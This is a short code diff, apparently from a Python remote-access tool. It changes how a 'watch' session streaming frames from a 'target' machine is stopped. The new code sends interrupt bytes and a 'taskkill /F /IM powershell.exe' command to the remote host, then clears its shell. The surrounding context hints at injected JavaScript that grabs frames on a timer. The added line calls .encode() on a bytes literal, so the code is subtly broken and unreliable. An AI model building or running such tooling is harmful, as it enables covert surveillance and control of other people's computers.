@@ -1026,7 +1026,18 @@ setInterval(grab,{interval*1000});
                             while True:
                                 time.sleep(1)
                         except KeyboardInterrupt:
-                            s.sock.sendall(b"\x03")
+                            # kill the PowerShell loop on target
+                            try:
+                                s.sock.sendall(b"\x03")
+                                time.sleep(0.5)
+                                s.sock.sendall(b"\x03")
+                                time.sleep(0.5)
+                                s.sock.sendall(b"taskkill /F /IM powershell.exe\n".encode())
+                                time.sleep(1.0)
+                                # drain any leftover output so cmd.exe is clean
+                                s.recv(timeout=1)
+                            except Exception:
+                                pass
                             print(f"\n  {AMBER}[*] Watch stopped — {frame_count[0]} frames received{RST}")
                         finally:
                             recv_srv.shutdown()
